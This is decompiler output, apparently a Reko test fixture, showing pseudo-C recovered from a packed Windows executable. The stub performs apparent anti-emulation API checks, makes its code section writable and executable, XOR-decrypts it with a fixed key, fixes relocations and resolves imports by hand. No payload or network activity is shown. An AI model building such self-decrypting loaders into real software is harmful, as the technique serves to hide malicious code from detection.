// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register Eq_2 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	struct Eq_3 * esp_18;
	byte SCZO_19;
	byte SZO_22;
	bool C_23;
	word32 eax_24;
	bool Z_25;
	word32 ebp_26;
	word32 edi_27;
	byte cl_28;
	byte dl_29;
	word32 ecx_30;
	byte CZ_31;
	word32 edx_32;
	bool S_33;
	Eq_17 ebx_20;
	Eq_17 esi_104;
	SHLWAPI.dll!StrStrIA();
	if (eax_24 != 0x00)
		return 0x00;
	*(esp_18 - 0x04) = 0x00;
	*(esp_18 - 0x08) = 0x00;
	Eq_2 eax_57 = AddUsersToEncryptedFile(*(esp_18 - 0x08), *(esp_18 - 0x04));
	if (eax_57 == 0x00)
		return eax_57;
	*(esp_18 - 0x04) = ~0x00;
	*(esp_18 - 0x08) = ~0x00;
	Eq_65 eax_66 = AreAllAccessesGranted(*(esp_18 - 0x08), *(esp_18 - 0x04));
	if (eax_66 == 0x00)
		ebx_20 = eax_66 + 0x19;
	*(esp_18 - 0x04) = ebp_26;
	*(esp_18 - 0x08) = edi_27;
	*(esp_18 - 0x0C) = (char *) &esp_18->ptr0008 + 0x04;
	*(esp_18 - 0x10) = 0x40;
	*(esp_18 - 0x14) = 0x3000;
	*(esp_18 - 0x18) = 0x00401000;
	VirtualProtect(*(esp_18 - 0x18), *(esp_18 - 0x14), *(esp_18 - 0x10), *(esp_18 - 0x0C));
	esp_18->ptr0008 = esp_18->ptr0008 - 0x01;
	struct Eq_151 * eax_156 = null;
	do
	{
		if (esi_104 == ebx_20)
			esi_104 = null;
		eax_156->b401678 = esi_104[0x00404000] ^ eax_156->b401678 ^ 0xAA;
		Eq_17 esi_107 = esi_104 + 0x01;
		if (esi_107 == ebx_20)
			esi_107 = null;
		eax_156->b401679 = esi_107[0x00404000] ^ eax_156->b401679 ^ 0xAA;
		Eq_17 esi_117 = esi_107 + 0x01;
		if (esi_117 == ebx_20)
			esi_117 = null;
		eax_156->b40167A = esi_117[0x00404000] ^ eax_156->b40167A ^ 0xAA;
		Eq_17 esi_127 = esi_117 + 0x01;
		if (esi_127 == ebx_20)
			esi_127 = null;
		eax_156->b40167B = esi_127[0x00404000] ^ eax_156->b40167B ^ 0xAA;
		Eq_17 esi_137 = esi_127 + 0x01;
		if (esi_137 == ebx_20)
			esi_137 = null;
		eax_156[700010] = (struct Eq_151) (esi_137[0x00404000] ^ eax_156[700010] ^ 0xAA);
		Eq_17 esi_147 = esi_137 + 0x01;
		if (esi_147 == ebx_20)
			esi_147 = null;
		eax_156 = eax_156 + 0x01;
		eax_156->b401677 = esi_147[0x00404000] ^ eax_156->b40167D ^ 0xAA;
		esi_104 = (Eq_17) (esi_147 + 0x01);
	} while (eax_156 < (struct Eq_151 *) 0x1440);
	esp_18->ptr0008 = (struct Eq_145 *) ((char *) &esp_18->ptr0008->dw0000 + 0x01);
	esp_18->dw0014 = 4199416;
	esp_18->ptr0010 = null;
	int32 edi_165 = 4199416;
	struct Eq_278 * ecx_166 = &globals->t402978;
	if (esp_18->ptr0008 > null)
	{
		do
		{
			Eq_295 eax_303 = ecx_166->t0004 - 0x08 >> 0x01;
			word16 * edx_306 = (char *) &ecx_166->t0004 + 0x04;
			if (eax_303 > 0x00)
			{
				Eq_295 ebx_320 = eax_303;
				do
				{
					ui32 eax_324 = (word32) *edx_306;
					if ((eax_324 & 0xF000) == 0x3000)
					{
						struct Eq_413 * eax_336 = (eax_324 & 0x0FFF) + ecx_166->dw0000;
						eax_336->dw4013F8 = eax_336->dw4013F8 + 0xF04013F8;
					}
					edx_306 = edx_306 + 0x01;
					ebx_320 = ebx_320 - 0x01;
				} while (ebx_320 != 0x00);
			}
			Eq_298 eax_312 = ecx_166->t0004;
			word32 edx_314 = Mem173[esp_18 + 0x10:word32] + eax_312;
			esp_18->ptr0010 = edx_314;
			ecx_166 = ecx_166 + eax_312;
		} while (edx_314 < esp_18->ptr0008);
	}
	esp_18->ptr0010 = &globals->t40216C;
	struct Eq_145 * ebx_184 = &globals->t40216C;
	if (globals->dw40217C != 0x00)
	{
		do
		{
			*(esp_18 - 0x0C) = ebx_184->dw000C + edi_165;
			Eq_361 eax_214 = LoadLibraryA(*(esp_18 - 0x0C));
			esp_18->t0018 = eax_214;
			Eq_361 ecx_216 = eax_214;
			if (eax_214 != null)
			{
				ptr32 ebp_239 = ebx_184->dw0000;
				if (ebp_239 == 0x00)
					ebp_239 = ebx_184->dw0010;
				Eq_392 eax_245 = ebp_239 + edi_165;
				struct Eq_395 * ebp_246 = ebp_239 + edi_165;
				word32 * esi_247 = ebx_184->dw0010 + edi_165;
				if (eax_245 != 0x00)
				{
					while (true)
					{
						Eq_427 eax_265;
						if (eax_245 < 0x00)
						{
							*(esp_18 - 0x0C) = (word32) ebp_246->w0000;
							*(esp_18 - 0x10) = (HMODULE *) ecx_216;
							eax_265 = GetProcAddress(*(esp_18 - 0x10), *(esp_18 - 0x0C));
						}
						else
						{
							*(esp_18 - 0x0C) = (word32) eax_245 + 0x02 + edi_165;
							*(esp_18 - 0x10) = (HMODULE *) ecx_216;
							eax_265 = GetProcAddress(*(esp_18 - 0x10), *(esp_18 - 0x0C));
						}
						*esi_247 = (word32) eax_265;
						ebp_246 = ebp_246 + 0x01;
						eax_245.u1 = ebp_246->w0000;
						edi_165 = esp_18->dw0014;
						esi_247 = esi_247 + 0x01;
						if (eax_245 == 0x00)
							break;
						ecx_216 = esp_18->t0018;
					}
					ebx_184 = esp_18->ptr0010;
				}
			}
			ebx_184 = ebx_184 + 0x01;
			esp_18->ptr0010 = ebx_184;
		} while (ebx_184->dw0010 != 0x00);
	}
	fn00401E58();
	*(esp_18 - 0x0C) = 0x00;
	ExitProcess(*(esp_18 - 0x0C));
}

// 00401E58: void fn00401E58()
void fn00401E58()
{
}

